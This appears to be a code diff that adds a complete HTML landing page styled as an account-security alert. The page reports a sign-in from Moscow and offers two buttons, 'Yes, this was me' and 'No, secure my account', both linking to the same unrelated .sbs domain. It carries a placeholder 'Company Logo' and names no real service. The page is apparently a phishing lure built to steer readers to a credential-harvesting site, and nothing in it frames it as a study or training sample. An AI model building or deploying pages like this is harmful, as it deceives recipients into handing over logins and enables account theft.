@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Activity Notification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    :root{
+      --bg: #f5f5f5;
+      --card: #ffffff;
+      --text: #333333;
+      --muted: #777777;
+      --green: #2e7d32;
+      --red: #c62828;
+      --radius: 8px;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: var(--bg);
+      font-family: Arial, sans-serif;
+      color: var(--text);
+    }
+
+    .page {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 720px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: 0 10px 25px rgba(0,0,0,.05);
+      overflow: hidden;
+    }
+
+    @media (max-width: 600px) {
+      .card {
+        border-radius: 0;
+      }
+    }
+
+    .header {
+      padding: 22px 24px 0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo {
+      width: 80px;
+      height: 20px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .content {
+      padding: 18px 24px 28px;
+    }
+
+    h2 {
+      margin: 8px 0 12px;
+      font-size: 22px;
+    }
+
+    p {
+      margin: 0 0 12px;
+      line-height: 1.5;
+    }
+
+    .lead {
+      font-size: 15px;
+    }
+
+    .details {
+      margin: 12px 0 20px;
+      line-height: 1.5;
+    }
+
+    .detail-row {
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .cta-row {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin: 12px 0 4px;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 12px 18px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: 700;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      text-align: center;
+      min-width: 180px;
+    }
+
+    .btn-green {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .btn-red {
+      background: var(--red);
+      color: #fff;
+    }
+
+    .footer-note {
+      font-size: 12px;
+      color: var(--muted);
+      padding: 0 24px 20px;
+    }
+  </style>
+</head>
+<body>
+  <main class="page" aria-label="Account activity notification landing page">
+    <section class="card" aria-labelledby="page-title">
+      <header class="header">
+        <img class="logo" src="https://6zof95goi8.ucarecd.net/b64e9eab-fbca-46d8-865a-73c105c51bf5/idcvV7_9j__1771588589135.png" alt="Company Logo" />
+      </header>
+
+      <div class="content">
+        <h2 id="page-title" style="color: #000;">Account Activity Notification</h2>
+
+        <p class="lead">
+          We noticed a recent sign‑in to your account. Please confirm if this was you.
+        </p>
+
+        <div class="details" aria-label="Activity details">
+          <strong>Activity Details:</strong><br>
+          <span class="detail-row">Date: Friday, February 20th, 2026</span>
+          <span class="detail-row">Time: 07:55 AM EST</span>
+          <span class="detail-row">Location: Moscow, Russia</span>
+          <span class="detail-row">Device: Windows 10 · Chrome Browser</span>
+        </div>
+
+        <div class="cta-row" role="group" aria-label="Responses">
+          <a href="https://www.searcherbaycontact.sbs/indra-activity" class="btn btn-green" aria-label="Yes, this was me">
+            Yes, this was me
+          </a>
+          <a href="https://www.searcherbaycontact.sbs/indra-activity" class="btn btn-red" aria-label="No, secure my account">
+            No, secure my account
+          </a>
+        </div>
+
+        <p class="footer-note">
+          If you did not expect this activity, you can ignore this message or contact support via our website.
+        </p>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
